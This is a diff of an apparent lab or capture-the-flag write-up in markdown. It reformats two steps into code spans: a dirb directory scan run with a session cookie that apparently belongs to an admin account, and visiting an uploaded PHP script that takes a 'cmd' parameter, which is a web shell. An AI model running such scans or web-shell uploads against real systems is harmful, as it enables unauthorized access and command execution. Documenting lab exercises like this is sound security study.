@@ -40,7 +40,7 @@ And a long password
 ![image4](../resources/7290a6dcbd2142038dcf860038e50970.png)
 
 - Do a directory scan:
-dirb <http://10.102.88.96> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -c "session=eyJlbWFpbCI6ImFkbWluMkBteXdlYnNpdGUuY29tIn0.ZkxlMA.8rXIHijh614ybDQnm6DKb5ABNO8"
+`dirb http://10.102.88.96 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -c "session=eyJlbWFpbCI6ImFkbWluMkBteXdlYnNpdGUuY29tIn0.ZkxlMA.8rXIHijh614ybDQnm6DKb5ABNO8"`
 
 
 ![image5](../resources/63d473c8b4154fbc95ea8c1f6e651de5.png)
@@ -75,7 +75,7 @@ if (isset($_GET['cmd'])) {
 
 - Upload that file
 
-- Go to <http://10.102.88.96/static/uploads/script.php>
+- Go to  `http://10.102.88.96/static/uploads/script.php`
 
 ![image7](../resources/8f74a9b4fd9c4b96a62b6c0040913d0d.png)
 
